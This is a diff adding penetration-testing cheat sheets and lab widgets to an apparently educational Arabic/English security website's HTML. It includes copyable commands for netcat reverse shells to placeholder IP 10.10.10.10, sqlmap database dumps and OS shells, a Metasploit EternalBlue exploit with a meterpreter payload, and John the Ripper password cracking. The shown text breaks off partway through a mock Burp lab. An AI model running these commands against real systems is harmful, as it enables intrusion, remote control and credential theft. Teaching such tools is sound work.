@@ -420,6 +420,19 @@
                 </div>
               </div>
 
+              <!-- CTF Leaderboard Card -->
+              <div class="cyber-card leaderboard-card" style="margin-top:20px; box-shadow: 0 0 15px rgba(255, 170, 0, 0.08); border-color: rgba(255, 170, 0, 0.25);">
+                <div class="card-header" style="border-bottom: 1px solid rgba(255, 170, 0, 0.15); padding-bottom: 10px; display:flex; justify-content:space-between; align-items:center;">
+                  <h3 style="margin:0; font-size:1.05rem; display:flex; align-items:center; gap:8px; color:var(--accent-orange);">🏆 لوحة المتصدرين الأمنية (CTF Leaderboard)</h3>
+                  <span class="badge" style="background: rgba(255, 170, 0, 0.1); color: var(--accent-orange); border: 1px solid var(--accent-orange); font-size: 0.65rem; font-family: monospace;">TOP OFFENSIVE</span>
+                </div>
+                <div class="leaderboard-card-body" style="padding: 15px 0 0 0;">
+                  <div class="leaderboard-table" id="ctf-leaderboard-rows" style="display:flex; flex-direction:column; gap:10px; direction:rtl; text-align:right;">
+                    <!-- Dynamically populated -->
+                  </div>
+                </div>
+              </div>
+
             </div>
 
             <!-- Right Side: Quick Tools & Recent Articles -->
@@ -632,12 +645,21 @@
                   <span class="f-title">Reverse Engineering</span>
                 </div>
                 
+                <div class="explorer-folder" id="ef-cheatsheet" onclick="openExplorerFolder('cheatsheet')">
+                  <span class="f-icon">📝</span>
+                  <span class="f-title">Cheat Sheets</span>
+                </div>
+                
               </div>
             </div>
 
             <!-- Pane 2: Tools Panel -->
             <div class="explorer-tools-panel">
               <h3 class="explorer-title">// Tools List</h3>
+              <div class="explorer-search-wrapper" style="padding: 10px 15px; border-bottom: 1px solid var(--border-color); display: flex; align-items: center; gap: 8px;">
+                <span class="search-icon" style="color: var(--text-muted); font-size: 0.9rem;">🔍</span>
+                <input type="text" id="explorerToolSearch" placeholder="Search tools & cheat sheets..." onkeyup="filterExplorerTools()" style="width: 100%; background: rgba(255,255,255,0.03); border: 1px solid var(--border-color); border-radius: 4px; padding: 6px 10px; color: var(--text-color); font-size: 0.85rem; font-family: inherit; outline: none; transition: border-color 0.2s;" />
+              </div>
               
               <div id="emptyToolsState" class="empty-state">
                 <span class="empty-icon">📁</span>
@@ -1432,6 +1454,44 @@
                   <div class="t-info">
                     <span class="t-name">Binary Ninja</span>
                     <span class="t-meta">Very Fast | Very High</span>
+                  </div>
+                </div>
+              </div>
+              
+              <div class="tools-list" id="tools-cheatsheet" style="display: none;">
+                <div class="tool-list-item" id="ti-nmap-cheat" onclick="openExplorerTool('nmap-cheat')">
+                  <span class="t-icon">🎯</span>
+                  <div class="t-info">
+                    <span class="t-name">Nmap Cheat Sheet</span>
+                    <span class="t-meta">Scanning | Port Probe</span>
+                  </div>
+                </div>
+                <div class="tool-list-item" id="ti-sqlmap-cheat" onclick="openExplorerTool('sqlmap-cheat')">
+                  <span class="t-icon">💉</span>
+                  <div class="t-info">
+                    <span class="t-name">SQLmap Cheat Sheet</span>
+                    <span class="t-meta">SQLi | Auto Exploit</span>
+                  </div>
+                </div>
+                <div class="tool-list-item" id="ti-metasploit-cheat" onclick="openExplorerTool('metasploit-cheat')">
+                  <span class="t-icon">💀</span>
+                  <div class="t-info">
+                    <span class="t-name">Metasploit Cheat Sheet</span>
+                    <span class="t-meta">Exploitation | RCE</span>
+                  </div>
+                </div>
+                <div class="tool-list-item" id="ti-netcat-cheat" onclick="openExplorerTool('netcat-cheat')">
+                  <span class="t-icon">📡</span>
+                  <div class="t-info">
+                    <span class="t-name">Netcat Cheat Sheet</span>
+                    <span class="t-meta">Shells | Port Listen</span>
+                  </div>
+                </div>
+                <div class="tool-list-item" id="ti-john-cheat" onclick="openExplorerTool('john-cheat')">
+                  <span class="t-icon">🔑</span>
+                  <div class="t-info">
+                    <span class="t-name">John the Ripper</span>
+                    <span class="t-meta">Cracking | Passwords</span>
                   </div>
                 </div>
               </div>
@@ -15845,6 +15905,387 @@
                   </div>
                 </div>
 
+                <!-- ========================================== -->
+                <!-- CHEAT SHEETS QUICK REFERENCE               -->
+                <!-- ========================================== -->
+
+                <!-- 1. nmap-cheat -->
+                <div class="tool-content-view" id="content-nmap-cheat" style="display: none; --tool-color: #00ffff;">
+                  <div class="cyber-hero">
+                    <div class="hero-left">
+                      <h2 class="hero-title"><span class="hero-icon">🎯</span> Nmap Cheat Sheet</h2>
+                      <p class="hero-tagline">Network scanning & service discovery quick reference</p>
+                      <div class="hero-badges">
+                        <span class="cyber-badge">SCANNING</span>
+                        <span class="cyber-badge">PORT-PROBE</span>
+                        <span class="cyber-badge">NET-DISCOVERY</span>
+                      </div>
+                    </div>
+                    <div class="hero-right">
+                      <div class="stat-row">
+                        <div class="stat-label"><span>Versatility</span><span>98%</span></div>
+                        <div class="stat-bar-bg"><div class="stat-bar-fill" style="width: 98%;"></div></div>
+                      </div>
+                      <div class="stat-row">
+                        <div class="stat-label"><span>Complexity</span><span>40%</span></div>
+                        <div class="stat-bar-bg"><div class="stat-bar-fill" style="width: 40%;"></div></div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="cyber-tabs">
+                    <button class="cyber-tab-btn active" onclick="switchCyberTab(this, 'tab-overview-nmap-cheat')">Overview</button>
+                    <button class="cyber-tab-btn" onclick="switchCyberTab(this, 'tab-commands-nmap-cheat')">Commands Reference</button>
+                  </div>
+                  <div class="tab-pane active" id="tab-overview-nmap-cheat">
+                    <div class="cyber-card">
+                      <h3>What is Nmap? / ما هو؟</h3>
+                      <p>أداة مجانية ومفتوحة المصدر لاستكشاف الشبكة وتدقيق أمن المنافذ والخدمات النشطة عليها.</p>
+                    </div>
+                    <div class="cyber-card">
+                      <h3>Scan Types Overview / أنواع الفحص</h3>
+                      <p>تستخدم Nmap حزم IP الخام بطرق مبتكرة لتحديد الأجهزة المتاحة على الشبكة، والخدمات (اسم التطبيق وإصداره)، ونظام التشغيل الفعلي.</p>
+                    </div>
+                  </div>
+                  <div class="tab-pane" id="tab-commands-nmap-cheat" style="display:none;">
+                    <div class="cyber-card">
+                      <h3>Useful Commands / أوامر مفيدة</h3>
+                      <p>انقر على زر النسخ لنسخ الأمر مباشرة إلى الحافظة:</p>
+                      
+                      <div style="margin-bottom: 15px;">
+                        <strong>1. Simple Scan / فحص بسيط للمنافذ الشائعة:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">nmap 192.168.1.1</pre>
+                        <button class="cmd-btn" onclick="copyText('nmap 192.168.1.1', this)">📋 Copy</button>
+                      </div>
+
+                      <div style="margin-bottom: 15px;">
+                        <strong>2. Syn Stealth Scan + OS Detection / فحص متخفٍ مع تحديد نظام التشغيل:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">nmap -sS -O 192.168.1.1</pre>
+                        <button class="cmd-btn" onclick="copyText('nmap -sS -O 192.168.1.1', this)">📋 Copy</button>
+                      </div>
+
+                      <div style="margin-bottom: 15px;">
+                        <strong>3. Scan All Ports / فحص جميع المنافذ الـ 65535:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">nmap -p- 192.168.1.1</pre>
+                        <button class="cmd-btn" onclick="copyText('nmap -p- 192.168.1.1', this)">📋 Copy</button>
+                      </div>
+
+                      <div style="margin-bottom: 15px;">
+                        <strong>4. Service Version + Default Scripts / فحص إصدارات الخدمات والسكربتات الافتراضية:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">nmap -sC -sV 192.168.1.1</pre>
+                        <button class="cmd-btn" onclick="copyText('nmap -sC -sV 192.168.1.1', this)">📋 Copy</button>
+                      </div>
+
+                      <div style="margin-bottom: 15px;">
+                        <strong>5. Fast Scan / فحص سريع لأهم 100 منفذ:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">nmap -F 192.168.1.1</pre>
+                        <button class="cmd-btn" onclick="copyText('nmap -F 192.168.1.1', this)">📋 Copy</button>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <!-- 2. sqlmap-cheat -->
+                <div class="tool-content-view" id="content-sqlmap-cheat" style="display: none; --tool-color: #ff00ff;">
+                  <div class="cyber-hero">
+                    <div class="hero-left">
+                      <h2 class="hero-title"><span class="hero-icon">💉</span> SQLmap Cheat Sheet</h2>
+                      <p class="hero-tagline">Automated SQL Injection & Database Takeover reference</p>
+                      <div class="hero-badges">
+                        <span class="cyber-badge">SQL-INJECTION</span>
+                        <span class="cyber-badge">AUTO-EXPLOIT</span>
+                        <span class="cyber-badge">DATABASE-DUMP</span>
+                      </div>
+                    </div>
+                    <div class="hero-right">
+                      <div class="stat-row">
+                        <div class="stat-label"><span>Power</span><span>99%</span></div>
+                        <div class="stat-bar-bg"><div class="stat-bar-fill" style="width: 99%;"></div></div>
+                      </div>
+                      <div class="stat-row">
+                        <div class="stat-label"><span>Complexity</span><span>60%</span></div>
+                        <div class="stat-bar-bg"><div class="stat-bar-fill" style="width: 60%;"></div></div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="cyber-tabs">
+                    <button class="cyber-tab-btn active" onclick="switchCyberTab(this, 'tab-overview-sqlmap-cheat')">Overview</button>
+                    <button class="cyber-tab-btn" onclick="switchCyberTab(this, 'tab-commands-sqlmap-cheat')">Commands Reference</button>
+                  </div>
+                  <div class="tab-pane active" id="tab-overview-sqlmap-cheat">
+                    <div class="cyber-card">
+                      <h3>What is SQLmap? / ما هو؟</h3>
+                      <p>أداة اختبار اختراق مفتوحة المصدر تقوم بأتمتة عملية اكتشاف واستغلال ثغرات حقن قواعد البيانات (SQL Injection) والاستيلاء على خوادم قواعد البيانات.</p>
+                    </div>
+                    <div class="cyber-card">
+                      <h3>Features / الميزات</h3>
+                      <p>تدعم بشكل كامل طيفاً واسعاً من أنظمة إدارة قواعد البيانات (MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Access, etc.) واستخراج البيانات بكفاءة عالية.</p>
+                    </div>
+                  </div>
+                  <div class="tab-pane" id="tab-commands-sqlmap-cheat" style="display:none;">
+                    <div class="cyber-card">
+                      <h3>Useful Commands / أوامر مفيدة</h3>
+                      <p>انقر على زر النسخ لنسخ الأمر مباشرة إلى الحافظة:</p>
+                      
+                      <div style="margin-bottom: 15px;">
+                        <strong>1. Basic GET Scan / فحص رابط ويب جلب البيانات وتحديد القواعد:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">sqlmap -u "http://target.com/page.php?id=1" --dbs</pre>
+                        <button class="cmd-btn" onclick="copyText('sqlmap -u &quot;http://target.com/page.php?id=1&quot; --dbs', this)">📋 Copy</button>
+                      </div>
+
+                      <div style="margin-bottom: 15px;">
+                        <strong>2. Crawl & Dump Target / استخراج وتفريغ جدول معين:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">sqlmap -u "http://target.com/page.php?id=1" -D db_name -T users --dump</pre>
+                        <button class="cmd-btn" onclick="copyText('sqlmap -u &quot;http://target.com/page.php?id=1&quot; -D db_name -T users --dump', this)">📋 Copy</button>
+                      </div>
+
+                      <div style="margin-bottom: 15px;">
+                        <strong>3. POST Request Scan / فحص طلب POST مخزن بملف نصي:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">sqlmap -r request.txt --dbs</pre>
+                        <button class="cmd-btn" onclick="copyText('sqlmap -r request.txt --dbs', this)">📋 Copy</button>
+                      </div>
+
+                      <div style="margin-bottom: 15px;">
+                        <strong>4. Specify DBMS / فحص مع تحديد نوع قاعدة البيانات لسرعة أكبر:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql --dbs</pre>
+                        <button class="cmd-btn" onclick="copyText('sqlmap -u &quot;http://target.com/page.php?id=1&quot; --dbms=mysql --dbs', this)">📋 Copy</button>
+                      </div>
+
+                      <div style="margin-bottom: 15px;">
+                        <strong>5. Spawn OS Shell / محاولة فتح سطر أوامر النظام عبر قواعد البيانات:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">sqlmap -u "http://target.com/page.php?id=1" --os-shell</pre>
+                        <button class="cmd-btn" onclick="copyText('sqlmap -u &quot;http://target.com/page.php?id=1&quot; --os-shell', this)">📋 Copy</button>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <!-- 3. metasploit-cheat -->
+                <div class="tool-content-view" id="content-metasploit-cheat" style="display: none; --tool-color: #ff3333;">
+                  <div class="cyber-hero">
+                    <div class="hero-left">
+                      <h2 class="hero-title"><span class="hero-icon">💀</span> Metasploit Cheat Sheet</h2>
+                      <p class="hero-tagline">Exploitation framework & payload execution reference</p>
+                      <div class="hero-badges">
+                        <span class="cyber-badge">EXPLOITATION</span>
+                        <span class="cyber-badge">RCE</span>
+                        <span class="cyber-badge">POST-EXPLOIT</span>
+                      </div>
+                    </div>
+                    <div class="hero-right">
+                      <div class="stat-row">
+                        <div class="stat-label"><span>Database Size</span><span>95%</span></div>
+                        <div class="stat-bar-bg"><div class="stat-bar-fill" style="width: 95%;"></div></div>
+                      </div>
+                      <div class="stat-row">
+                        <div class="stat-label"><span>Complexity</span><span>70%</span></div>
+                        <div class="stat-bar-bg"><div class="stat-bar-fill" style="width: 70%;"></div></div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="cyber-tabs">
+                    <button class="cyber-tab-btn active" onclick="switchCyberTab(this, 'tab-overview-metasploit-cheat')">Overview</button>
+                    <button class="cyber-tab-btn" onclick="switchCyberTab(this, 'tab-commands-metasploit-cheat')">Commands Reference</button>
+                  </div>
+                  <div class="tab-pane active" id="tab-overview-metasploit-cheat">
+                    <div class="cyber-card">
+                      <h3>What is Metasploit? / ما هو؟</h3>
+                      <p>إطار عمل شهير لاختبار الاختراق واستغلال الثغرات البرمجية في الأجهزة، الشبكات، والأنظمة.</p>
+                    </div>
+                    <div class="cyber-card">
+                      <h3>Modules Structure / بنية الوحدات</h3>
+                      <p>يحتوي إطار العمل على آلاف الثغرات الجاهزة (Exploits)، والمساعدات (Auxiliary)، والمشغلات البرمجية (Payloads) مثل Meterpreter الشهير.</p>
+                    </div>
+                  </div>
+                  <div class="tab-pane" id="tab-commands-metasploit-cheat" style="display:none;">
+                    <div class="cyber-card">
+                      <h3>Useful Commands / أوامر مفيدة</h3>
+                      <p>انقر على زر النسخ لنسخ الأمر مباشرة إلى الحافظة:</p>
+                      
+                      <div style="margin-bottom: 15px;">
+                        <strong>1. Start Console / تشغيل إطار العمل:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">msfconsole</pre>
+                        <button class="cmd-btn" onclick="copyText('msfconsole', this)">📋 Copy</button>
+                      </div>
+
+                      <div style="margin-bottom: 15px;">
+                        <strong>2. Search Exploit / البحث عن ثغرة معينة:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">search eternalblue</pre>
+                        <button class="cmd-btn" onclick="copyText('search eternalblue', this)">📋 Copy</button>
+                      </div>
+
+                      <div style="margin-bottom: 15px;">
+                        <strong>3. Load Module / تحميل واستخدام ثغرة:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">use exploit/windows/smb/ms17_010_eternalblue</pre>
+                        <button class="cmd-btn" onclick="copyText('use exploit/windows/smb/ms17_010_eternalblue', this)">📋 Copy</button>
+                      </div>
+
+                      <div style="margin-bottom: 15px;">
+                        <strong>4. Set Payload / تحديد المشغل العكسي للحصول على تحكم:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">set payload windows/x64/meterpreter/reverse_tcp</pre>
+                        <button class="cmd-btn" onclick="copyText('set payload windows/x64/meterpreter/reverse_tcp', this)">📋 Copy</button>
+                      </div>
+
+                      <div style="margin-bottom: 15px;">
+                        <strong>5. Run / تنفيذ الاستغلال وحقن الهدف:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">exploit</pre>
+                        <button class="cmd-btn" onclick="copyText('exploit', this)">📋 Copy</button>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <!-- 4. netcat-cheat -->
+                <div class="tool-content-view" id="content-netcat-cheat" style="display: none; --tool-color: #ff9900;">
+                  <div class="cyber-hero">
+                    <div class="hero-left">
+                      <h2 class="hero-title"><span class="hero-icon">📡</span> Netcat Cheat Sheet</h2>
+                      <p class="hero-tagline">Networking Swiss Army Knife quick reference</p>
+                      <div class="hero-badges">
+                        <span class="cyber-badge">SHELLS</span>
+                        <span class="cyber-badge">PORT-LISTEN</span>
+                        <span class="cyber-badge">DATA-TRANSFER</span>
+                      </div>
+                    </div>
+                    <div class="hero-right">
+                      <div class="stat-row">
+                        <div class="stat-label"><span>Portability</span><span>100%</span></div>
+                        <div class="stat-bar-bg"><div class="stat-bar-fill" style="width: 100%;"></div></div>
+                      </div>
+                      <div class="stat-row">
+                        <div class="stat-label"><span>Complexity</span><span>10%</span></div>
+                        <div class="stat-bar-bg"><div class="stat-bar-fill" style="width: 10%;"></div></div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="cyber-tabs">
+                    <button class="cyber-tab-btn active" onclick="switchCyberTab(this, 'tab-overview-netcat-cheat')">Overview</button>
+                    <button class="cyber-tab-btn" onclick="switchCyberTab(this, 'tab-commands-netcat-cheat')">Commands Reference</button>
+                  </div>
+                  <div class="tab-pane active" id="tab-overview-netcat-cheat">
+                    <div class="cyber-card">
+                      <h3>What is Netcat (nc)? / ما هو؟</h3>
+                      <p>سكين الجيش السويسري للشبكات، أداة سطر أوامر بسيطة لكنها خارقة قادرة على قراءة وكتابة البيانات عبر اتصالات الشبكة باستخدام بروتوكولات TCP أو UDP.</p>
+                    </div>
+                    <div class="cyber-card">
+                      <h3>Common Use Cases / حالات الاستخدام الشائعة</h3>
+                      <p>تستخدم لإنشاء اتصالات خلفية (Reverse Shells)، الاستماع للمنافذ وتدقيقها، أو حتى نقل الملفات مباشرة بين الخوادم.</p>
+                    </div>
+                  </div>
+                  <div class="tab-pane" id="tab-commands-netcat-cheat" style="display:none;">
+                    <div class="cyber-card">
+                      <h3>Useful Commands / أوامر مفيدة</h3>
+                      <p>انقر على زر النسخ لنسخ الأمر مباشرة إلى الحافظة:</p>
+                      
+                      <div style="margin-bottom: 15px;">
+                        <strong>1. Port Listener / الاستماع على منفذ محدد لاستقبال اتصالات:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">nc -lvnp 4444</pre>
+                        <button class="cmd-btn" onclick="copyText('nc -lvnp 4444', this)">📋 Copy</button>
+                      </div>
+
+                      <div style="margin-bottom: 15px;">
+                        <strong>2. Connect to Port / الاتصال بجهاز ومنفذ معين:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">nc 10.10.10.10 4444</pre>
+                        <button class="cmd-btn" onclick="copyText('nc 10.10.10.10 4444', this)">📋 Copy</button>
+                      </div>
+
+                      <div style="margin-bottom: 15px;">
+                        <strong>3. Linux Reverse Shell / إرسال سطر الأوامر لجهاز مستمع (Linux):</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">nc -e /bin/bash 10.10.10.10 4444</pre>
+                        <button class="cmd-btn" onclick="copyText('nc -e /bin/bash 10.10.10.10 4444', this)">📋 Copy</button>
+                      </div>
+
+                      <div style="margin-bottom: 15px;">
+                        <strong>4. OpenBSD Reverse Shell (Named Pipe) / شل عكسي متوافق مع كافة التوزيعات:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4444 &gt;/tmp/f</pre>
+                        <button class="cmd-btn" onclick="copyText('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4444 &gt;/tmp/f', this)">📋 Copy</button>
+                      </div>
+
+                      <div style="margin-bottom: 15px;">
+                        <strong>5. File Transfer / نقل ملف واستقباله على الطرف الآخر:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">nc -lvnp 4444 &gt; file.txt</pre>
+                        <button class="cmd-btn" onclick="copyText('nc -lvnp 4444 &gt; file.txt', this)">📋 Copy</button>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <!-- 5. john-cheat -->
+                <div class="tool-content-view" id="content-john-cheat" style="display: none; --tool-color: #ffff00;">
+                  <div class="cyber-hero">
+                    <div class="hero-left">
+                      <h2 class="hero-title"><span class="hero-icon">🔑</span> John the Ripper</h2>
+                      <p class="hero-tagline">Password cracker & hash auditor quick reference</p>
+                      <div class="hero-badges">
+                        <span class="cyber-badge">CRACKING</span>
+                        <span class="cyber-badge">PASSWORDS</span>
+                        <span class="cyber-badge">HASH-ATTACK</span>
+                      </div>
+                    </div>
+                    <div class="hero-right">
+                      <div class="stat-row">
+                        <div class="stat-label"><span>Cracking Speed</span><span>96%</span></div>
+                        <div class="stat-bar-bg"><div class="stat-bar-fill" style="width: 96%;"></div></div>
+                      </div>
+                      <div class="stat-row">
+                        <div class="stat-label"><span>Complexity</span><span>45%</span></div>
+                        <div class="stat-bar-bg"><div class="stat-bar-fill" style="width: 45%;"></div></div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="cyber-tabs">
+                    <button class="cyber-tab-btn active" onclick="switchCyberTab(this, 'tab-overview-john-cheat')">Overview</button>
+                    <button class="cyber-tab-btn" onclick="switchCyberTab(this, 'tab-commands-john-cheat')">Commands Reference</button>
+                  </div>
+                  <div class="tab-pane active" id="tab-overview-john-cheat">
+                    <div class="cyber-card">
+                      <h3>What is John the Ripper? / ما هو؟</h3>
+                      <p>أداة سريعة للغاية لاختبار أمن وقوة كلمات المرور وفك وتخمين التشفير (Hash Cracking).</p>
+                    </div>
+                    <div class="cyber-card">
+                      <h3>How it Works / كيف تعمل؟</h3>
+                      <p>تدمج بين هجمات القاموس (Dictionary attacks) والتحليل الذكي لإنشاء كلمات مرور مخصصة وقادرة على فك مئات الأنواع من الهاشات والملفات المضغوطة المشفرة.</p>
+                    </div>
+                  </div>
+                  <div class="tab-pane" id="tab-commands-john-cheat" style="display:none;">
+                    <div class="cyber-card">
+                      <h3>Useful Commands / أوامر مفيدة</h3>
+                      <p>انقر على زر النسخ لنسخ الأمر مباشرة إلى الحافظة:</p>
+                      
+                      <div style="margin-bottom: 15px;">
+                        <strong>1. Crack Shadow Hashes / فك كلمات مرور النظام باستخدام قائمة كلمات:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</pre>
+                        <button class="cmd-btn" onclick="copyText('john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt', this)">📋 Copy</button>
+                      </div>
+
+                      <div style="margin-bottom: 15px;">
+                        <strong>2. Show Cracked Passwords / إظهار كلمات المرور المخمنة مسبقاً:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">john --show hashes.txt</pre>
+                        <button class="cmd-btn" onclick="copyText('john --show hashes.txt', this)">📋 Copy</button>
+                      </div>
+
+                      <div style="margin-bottom: 15px;">
+                        <strong>3. Specifying Format / تحديد نوع التشفير يدوياً لفك الهاش:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">john --format=raw-md5 --wordlist=rockyou.txt hashes.txt</pre>
+                        <button class="cmd-btn" onclick="copyText('john --format=raw-md5 --wordlist=rockyou.txt hashes.txt', this)">📋 Copy</button>
+                      </div>
+
+                      <div style="margin-bottom: 15px;">
+                        <strong>4. Crack Zip Password / تخمين وفك تشفير ملف مضغوط ZIP:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">zip2john backup.zip &gt; zip.hash &amp;&amp; john --wordlist=rockyou.txt zip.hash</pre>
+                        <button class="cmd-btn" onclick="copyText('zip2john backup.zip &gt; zip.hash &amp;&amp; john --wordlist=rockyou.txt zip.hash', this)">📋 Copy</button>
+                      </div>
+
+                      <div style="margin-bottom: 15px;">
+                        <strong>5. Crack PDF Password / تخمين وفك كلمة مرور ملف PDF محمي:</strong>
+                        <pre style="background:#000;padding:12px;color:var(--neon-green);font-family:monospace;border-radius:4px;overflow-x:auto;margin:5px 0;">pdf2john document.pdf &gt; pdf.hash &amp;&amp; john --wordlist=rockyou.txt pdf.hash</pre>
+                        <button class="cmd-btn" onclick="copyText('pdf2john document.pdf &gt; pdf.hash &amp;&amp; john --wordlist=rockyou.txt pdf.hash', this)">📋 Copy</button>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+              </div>
+
 
     
                 
@@ -15881,6 +16322,15 @@
                 </div>
                 <h4 class="lab-card-title">🐚 Linux Terminal Simulator</h4>
                 <p class="lab-card-desc">تعلم أساسيات سطر الأوامر في لينكس وفك تشفير الملفات السرية للوصول للأعلام (Flags).</p>
+              </div>
+
+              <div class="lab-card" onclick="openLab('burp-sim', this)">
+                <div class="lab-card-meta">
+                  <span class="badge badge-medium">🟠 Medium</span>
+                  <span class="lab-duration">⏱ 20 min</span>
+                </div>
+                <h4 class="lab-card-title">📡 Burp Intruder Simulator</h4>
+                <p class="lab-card-desc">محاكاة تفاعلية لأداة Burp Suite Intruder لاختبار بايلودز تخطي الصلاحيات والتحقق.</p>
               </div>
 
               <a href="linux-security/linux-labs.html" class="lab-card" style="text-decoration:none;color:inherit;display:block;">
@@ -15987,8 +16437,88 @@
                     <div class="autocomplete-hint" id="autocompleteHint"></div>
                   </div>
                 </div>
-
               </div>
+
+              <div id="lab-burp-sim" class="active-lab-view" style="display: none;">
+                <!-- Burp Suite Interface Simulator -->
+                <div class="burp-interface" style="background:#0f111a; border: 1px solid rgba(255,255,255,0.08); border-radius:12px; padding:20px; color:#ddd; font-family:'Inter', sans-serif;">
+                  <div class="burp-header" style="border-bottom: 2px solid rgba(255,170,0,0.2); padding-bottom:12px; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center;">
+                    <span style="color:#ffaa00; font-weight:bold; font-family:'Fira Code', monospace; font-size:1.1rem; display:flex; align-items:center; gap:8px;">
+                      <span>📡</span> Burp Suite Pro (Intruder Mock-Up)
+                    </span>
+                    <span class="badge" style="background:rgba(255, 170, 0, 0.1); color:#ffaa00; border: 1px solid rgba(255, 170, 0, 0.3); font-size:0.7rem; font-weight:bold;">INTRUDER</span>
+                  </div>
+                  
+                  <div class="burp-body-grid" style="display:grid; grid-template-columns: 1.2fr 0.8fr; gap:20px; margin-bottom:20px;">
+                    <!-- HTTP Request Template -->
+                    <div style="background:#030308; border: 1px solid rgba(255,255,255,0.05); padding:15px; border-radius:8px; text-align:left;">
+                      <h4 style="color:var(--accent-cyan); margin:0 0 10px 0; font-size:0.9rem; font-family:'Fira Code', monospace;">HTTP Request Template:</h4>
+                      <pre style="font-family:'Fira Code', monospace; font-size:0.75rem; color:#a5b4fc; margin:0; line-height:1.5; white-space:pre-wrap;">POST /login HTTP/1.1
+Host: secure-bank.internal
+Content-Type: application/json
+User-Agent: Mozilla/5.0
+Authorization: Basic <span id="burp-payload-marker" style="background:rgba(0,255,102,0.15); border:1px dashed var(--accent-green); padding:2px 6px; color:#fff; font-weight:bold; border-radius:3px;">§[Payload_Position]§</span>
+
+{
+  "username": "admin",
+  "auth_token": "token_val"
+}</pre>
+                    </div>
+
+                    <!-- Options & Launch -->
+                    <div style="display:flex; flex-direction:column; justify-content:space-between; direction:rtl; text-align:right;">
+                      <div>
+                        <label style="display:block; font-size:0.85rem; color:var(--text-secondary); margin-bottom:8px; font-weight:bold;">قائمة الكلمات (Select Payload Type):</label>
+                        <select id="burp-payload-select" style="width:100%; padding:10px; background:#080812; border:1px solid rgba(255,255,255,0.1); border-radius:6px; color:#fff; font-family:inherit; font-size:0.85rem; margin-bottom:15px;">
+                          <option value="auth_bypass">خيار 1: بايلودز تخطي الصلاحيات (SQL Auth Bypass)</option>
+                          <option value="common_pass">خيار 2: تخمين التوكن الشائع (Token Brute-Force)</option>
+                        </select>
+                        
+                        <p style="font-size:0.8rem; color:var(--text-muted); line-height:1.5; margin:0 0 15px 0;">
+                          تعتمد فكرة Intruder على إدخال قائمة من الكلمات التجريبية في مكان محدد في الطلب (Request) وتحليل استجابات السيرفر.
+                        </p>
+                      </div>
+
